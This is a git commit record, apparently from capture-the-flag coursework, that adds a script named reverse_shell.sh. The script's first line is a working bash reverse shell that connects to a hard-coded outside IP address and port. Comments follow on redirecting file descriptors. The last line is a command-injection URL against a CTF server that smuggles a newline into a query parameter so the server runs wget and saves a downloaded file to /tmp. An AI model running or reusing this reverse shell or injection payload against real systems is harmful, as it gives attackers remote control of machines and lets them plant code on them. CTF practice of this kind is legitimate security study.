6072b7864db9326caafed3273fad0a7c49364504
Chou, Po-Yi <bob2006tw@gmail.com>
2019-10-26 16:40:56 +0800

    add temporary reverse shell

---
+++ scripts/reverse_shell.sh
@@ -0,0 +1,13 @@
+bash -i >& /dev/tcp/140.113.207.233/8000 0>&1
+# 0  ---->  /dev/tty0
+# 1  ---->  /dev/tty0
+# 2  ---->  /dev/tty0
+
+# 0  ---->  /dev/tty0
+# 1  ---->  /dev/tcp/localhost/8080
+# 2  --^
+
+# 0  --v
+# 1  ---->  /dev/tcp/localhost/8080
+# 2  --^
+#https://edu-ctf.csie.org:10153/?me0w=%0Awget%20https://send.firefox.com/download/a1ba9ba2ff108d4f/#l3PzOugXPKgqXN0pkb7lNA%20-O%20/tmp/g
